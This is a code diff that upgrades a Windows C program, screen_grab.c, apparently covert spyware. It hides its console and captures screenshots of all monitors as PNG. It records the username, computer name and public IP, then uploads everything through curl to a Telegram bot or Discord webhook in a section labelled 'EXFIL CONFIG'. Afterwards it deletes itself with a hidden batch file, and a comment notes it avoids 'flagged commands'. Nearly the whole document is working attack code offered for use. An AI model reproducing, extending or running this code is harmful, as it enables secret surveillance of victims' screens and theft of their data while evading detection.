@@ -1,27 +1,20 @@
 /*
- * screen_grab.c — Captures screenshot of primary monitor via GDI
- * Sends the image to Telegram/Discord
+ * screen_grab.c — Captures screenshot of ALL monitors as PNG
  *
  * HOW IT WORKS:
- * 1. Gets primary monitor dimensions via GetSystemMetrics
- * 2. Captures screen using GDI (CreateCompatibleDC, BitBlt)
- * 3. Saves as BMP temp file
- * 4. Sends to Telegram (sendPhoto) or Discord (webhook file upload)
- * 5. Cleans up temp file and self-deletes
+ * 1. Gets virtual screen dimensions (all monitors combined)
+ * 2. Captures entire virtual desktop using GDI BitBlt
+ * 3. Encodes as PNG via GDI+ flat API (loaded dynamically)
+ * 4. Sends to Telegram/Discord
+ * 5. Cleans up and self-deletes
  *
  * Uses native Windows APIs:
  * - gdi32.lib for screen capture (BitBlt, CreateCompatibleDC)
- * - user32.lib for GetSystemMetrics, GetDesktopWindow
+ * - user32.lib for GetSystemMetrics (virtual screen)
+ * - gdiplus.dll loaded at runtime for PNG encoding
  * - No PowerShell, no flagged commands
  *
  * Compile: python build.py screen --telegram --token X --chat Y
- *
- * Manual compile (MSVC):
- *   cl screen_grab.c /Fe:screen_grab.exe /DUSE_TELEGRAM /DTG_TOKEN="token" /DTG_CHAT="chat_id"
- *   cl screen_grab.c /Fe:screen_grab.exe /DUSE_DISCORD /DDC_WEBHOOK="webhook_url"
- *
- * Manual compile (GCC):
- *   gcc screen_grab.c -o screen_grab.exe -lgdi32 -luser32 -ladvapi32
  */
 
 #include <windows.h>
@@ -34,9 +27,7 @@
 #pragma comment(lib, "advapi32.lib")
 
 // ══════════════════════════════════════════════════
-// EXFIL CONFIG — Set via compiler flags:
-//   /DUSE_TELEGRAM /DTG_TOKEN="token" /DTG_CHAT="chat_id"
-//   /DUSE_DISCORD /DDC_WEBHOOK="webhook_url"
+// EXFIL CONFIG
 // ══════════════════════════════════════════════════
 
 #if !defined(USE_TELEGRAM) && !defined(USE_DISCORD)
@@ -48,12 +39,75 @@
 #endif
 
 #ifndef TG_CHAT
-#define TG_CHAT "YOUR_CHAT_ID_HERE"
+#define TG_CHAT "YOUR_CHAT_ID"
 #endif
 
 #ifndef DC_WEBHOOK
 #define DC_WEBHOOK "YOUR_WEBHOOK_URL"
 #endif
+
+// ══════════════════════════════════════════════════
+// GDI+ flat API types and function pointers
+// (Loaded dynamically to avoid C++ header issues)
+// ══════════════════════════════════════════════════
+
+typedef int GpStatus;
+typedef void GpBitmap;
+typedef void GpImage;
+
+typedef struct {
+    UINT32 GdiplusVersion;
+    void *DebugEventCallback;
+    BOOL SuppressBackgroundThread;
+    BOOL SuppressExternalCodecs;
+} GdiplusStartupInput;
+
+typedef struct {
+    UINT32 Data1;
+    UINT16 Data2;
+    UINT16 Data3;
+    BYTE Data4[8];
+} GUID_t;
+
+// PNG encoder CLSID: {557CF406-1A04-11D3-9A73-0000F81EF32E}
+static const GUID_t CLSID_PNG = {
+    0x557CF406, 0x1A04, 0x11D3,
+    {0x9A, 0x73, 0x00, 0x00, 0xF8, 0x1E, 0xF3, 0x2E}
+};
+
+// Function pointer types
+typedef GpStatus (__stdcall *fn_GdiplusStartup)(ULONG_PTR*, const GdiplusStartupInput*, void*);
+typedef void (__stdcall *fn_GdiplusShutdown)(ULONG_PTR);
+typedef GpStatus (__stdcall *fn_GdipCreateBitmapFromHBITMAP)(HBITMAP, HPALETTE, GpBitmap**);
+typedef GpStatus (__stdcall *fn_GdipSaveImageToFile)(GpImage*, const WCHAR*, const GUID_t*, const void*);
+typedef GpStatus (__stdcall *fn_GdipDisposeImage)(GpImage*);
+
+static fn_GdiplusStartup pGdiplusStartup;
+static fn_GdiplusShutdown pGdiplusShutdown;
+static fn_GdipCreateBitmapFromHBITMAP pGdipCreateBitmapFromHBITMAP;
+static fn_GdipSaveImageToFile pGdipSaveImageToFile;
+static fn_GdipDisposeImage pGdipDisposeImage;
+
+static HMODULE hGdiPlus = NULL;
+
+int load_gdiplus() {
+    hGdiPlus = LoadLibraryA("gdiplus.dll");
+    if (!hGdiPlus) return 0;
+
+    pGdiplusStartup = (fn_GdiplusStartup)GetProcAddress(hGdiPlus, "GdiplusStartup");
+    pGdiplusShutdown = (fn_GdiplusShutdown)GetProcAddress(hGdiPlus, "GdiplusShutdown");
+    pGdipCreateBitmapFromHBITMAP = (fn_GdipCreateBitmapFromHBITMAP)GetProcAddress(hGdiPlus, "GdipCreateBitmapFromHBITMAP");
+    pGdipSaveImageToFile = (fn_GdipSaveImageToFile)GetProcAddress(hGdiPlus, "GdipSaveImageToFile");
+    pGdipDisposeImage = (fn_GdipDisposeImage)GetProcAddress(hGdiPlus, "GdipDisposeImage");
+
+    if (!pGdiplusStartup || !pGdiplusShutdown || !pGdipCreateBitmapFromHBITMAP ||
+        !pGdipSaveImageToFile || !pGdipDisposeImage) {
+        FreeLibrary(hGdiPlus);
+        hGdiPlus = NULL;
+        return 0;
+    }
+    return 1;
+}
 
 // ══════════════════════════════════════════════════
 // Machine info (cached)
@@ -68,7 +122,6 @@ void init_info() {
     GetComputerNameA(compName, &s1);
     GetUserNameA(userName, &s2);
 
-    // Public IP
     system("C:\\Windows\\System32\\curl.exe -s ipinfo.io/ip > %temp%\\ip.txt 2>nul");
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
@@ -79,29 +132,32 @@ void init_info() {
     char *nl = strchr(pubIP, '\n'); if (nl) *nl = 0;
     nl = strchr(pubIP, '\r'); if (nl) *nl = 0;
 
-    // Screen resolution
-    int cx = GetSystemMetrics(SM_CXSCREEN);
-    int cy = GetSystemMetrics(SM_CYSCREEN);
+    int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    int vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    int nmon = GetSystemMetrics(SM_CMONITORS);
 
     snprintf(g_caption, sizeof(g_caption),
-        "ScreenGrab_%s@%s [%s] %dx%d", userName, compName, pubIP, cx, cy);
+        "ScreenGrab_%s@%s [%s] %dx%d (%d monitors)",
+        userName, compName, pubIP, vw, vh, nmon);
 }
 
 // ══════════════════════════════════════════════════
-// Screenshot capture via GDI
+// Multi-monitor screenshot → PNG
 // ══════════════════════════════════════════════════
 
 int capture_screen(const char *outpath) {
-    int width = GetSystemMetrics(SM_CXSCREEN);
-    int height = GetSystemMetrics(SM_CYSCREEN);
+    // Virtual screen = bounding rect of all monitors
+    int vx = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    int vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
 
     if (width <= 0 || height <= 0) return 0;
 
-    // Get screen DC
+    // Capture via GDI
     HDC hdcScreen = GetDC(NULL);
     if (!hdcScreen) return 0;
 
-    // Create compatible DC and bitmap
     HDC hdcMem = CreateCompatibleDC(hdcScreen);
     if (!hdcMem) {
         ReleaseDC(NULL, hdcScreen);
@@ -116,81 +172,62 @@ int capture_screen(const char *outpath) {
     }
 
     HGDIOBJ hOld = SelectObject(hdcMem, hBitmap);
-
-    // BitBlt the screen into our bitmap
-    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
-
+    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, vx, vy, SRCCOPY);
     SelectObject(hdcMem, hOld);
 
-    // Prepare BITMAPINFOHEADER
-    BITMAPINFOHEADER bi;
-    ZeroMemory(&bi, sizeof(bi));
-    bi.biSize = sizeof(BITMAPINFOHEADER);
-    bi.biWidth = width;
-    bi.biHeight = -height;  // Top-down DIB
-    bi.biPlanes = 1;
-    bi.biBitCount = 24;
-    bi.biCompression = BI_RGB;
-
-    // Calculate row stride (must be DWORD-aligned)
-    int stride = ((width * 3 + 3) & ~3);
-    int imageSize = stride * height;
-
-    // Allocate pixel buffer
-    BYTE *pixels = (BYTE *)malloc(imageSize);
-    if (!pixels) {
+    // Load GDI+ and save as PNG
+    if (!load_gdiplus()) {
         DeleteObject(hBitmap);
         DeleteDC(hdcMem);
         ReleaseDC(NULL, hdcScreen);
         return 0;
     }
 
-    // Get the bitmap bits
-    BITMAPINFO bmi;
-    ZeroMemory(&bmi, sizeof(bmi));
-    bmi.bmiHeader = bi;
-    GetDIBits(hdcMem, hBitmap, 0, height, pixels, &bmi, DIB_RGB_COLORS);
+    GdiplusStartupInput gdipInput;
+    ZeroMemory(&gdipInput, sizeof(gdipInput));
+    gdipInput.GdiplusVersion = 1;
+    ULONG_PTR gdipToken = 0;
 
-    // Write BMP file
-    BITMAPFILEHEADER bfh;
-    ZeroMemory(&bfh, sizeof(bfh));
-    bfh.bfType = 0x4D42;  // "BM"
-    bfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imageSize;
-    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
-
-    FILE *fp = fopen(outpath, "wb");
-    if (!fp) {
-        free(pixels);
+    if (pGdiplusStartup(&gdipToken, &gdipInput, NULL) != 0) {
         DeleteObject(hBitmap);
         DeleteDC(hdcMem);
         ReleaseDC(NULL, hdcScreen);
         return 0;
     }
 
-    fwrite(&bfh, sizeof(bfh), 1, fp);
-    fwrite(&bi, sizeof(bi), 1, fp);
-    fwrite(pixels, imageSize, 1, fp);
-    fclose(fp);
+    GpBitmap *gpBitmap = NULL;
+    pGdipCreateBitmapFromHBITMAP(hBitmap, NULL, &gpBitmap);
 
-    // Cleanup GDI
-    free(pixels);
+    int result = 0;
+    if (gpBitmap) {
+        wchar_t wPath[MAX_PATH];
+        MultiByteToWideChar(CP_ACP, 0, outpath, -1, wPath, MAX_PATH);
+
+        GpStatus status = pGdipSaveImageToFile((GpImage*)gpBitmap, wPath, &CLSID_PNG, NULL);
+        result = (status == 0) ? 1 : 0;
+
+        pGdipDisposeImage((GpImage*)gpBitmap);
+    }
+
+    pGdiplusShutdown(gdipToken);
+    FreeLibrary(hGdiPlus);
+
     DeleteObject(hBitmap);
     DeleteDC(hdcMem);
     ReleaseDC(NULL, hdcScreen);
 
-    return 1;
+    return result;
 }
 
 // ══════════════════════════════════════════════════
-// Send screenshot to Telegram/Discord
+// Send to Telegram/Discord
 // ══════════════════════════════════════════════════
 
-void send_photo(const char *filepath) {
+void send_file(const char *filepath) {
     init_info();
     char cmd[2048];
 
 #ifdef USE_TELEGRAM
-    // Telegram sendDocument (BMP too large for sendPhoto limit)
     snprintf(cmd, sizeof(cmd),
         "C:\\Windows\\System32\\curl.exe -s "
         "-F \"chat_id=" TG_CHAT "\" "
@@ -201,7 +238,6 @@ void send_photo(const char *filepath) {
 #endif
 
 #ifdef USE_DISCORD
-    // Discord webhook file upload
     snprintf(cmd, sizeof(cmd),
         "C:\\Windows\\System32\\curl.exe -s "
         "-F \"file=@%s\" "
@@ -214,19 +250,17 @@ void send_photo(const char *filepath) {
 }
 
 // ══════════════════════════════════════════════════
-// Self-delete via batch file trick
+// Self-delete
 // ══════════════════════════════════════════════════
 
 void self_delete() {
     char exePath[MAX_PATH], batPath[MAX_PATH], tmp[MAX_PATH];
-
     GetModuleFileNameA(NULL, exePath, MAX_PATH);
     GetTempPathA(MAX_PATH, tmp);
     snprintf(batPath, MAX_PATH, "%ssg_del.bat", tmp);
 
     FILE *bat = fopen(batPath, "w");
     if (!bat) return;
-
     fprintf(bat,
         "@echo off\n"
         ":retry\n"
@@ -236,7 +270,6 @@ void self_delete() {
         exePath, exePath);
     fclose(bat);
 
-    // Launch the batch file hidden
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
     ZeroMemory(&si, sizeof(si));
@@ -258,7 +291,6 @@ void self_delete() {
 // ══════════════════════════════════════════════════
 
 int main() {
-    // Hide console window
     HWND hwnd = GetConsoleWindow();
     if (hwnd) ShowWindow(hwnd, SW_HIDE);
 
@@ -266,18 +298,13 @@ int main() {
     GetTempPathA(MAX_PATH, tempPath);
 
     char outFile[MAX_PATH];
-    snprintf(outFile, MAX_PATH, "%ssg.bmp", tempPath);
+    snprintf(outFile, MAX_PATH, "%ssg.png", tempPath);
 
-    // Capture screenshot
     if (capture_screen(outFile)) {
-        // Send to Telegram/Discord
-        send_photo(outFile);
+        send_file(outFile);
     }
 
-    // Clean up temp file
     DeleteFileA(outFile);
-
-    // Self-delete the executable
     self_delete();
 
     return 0;
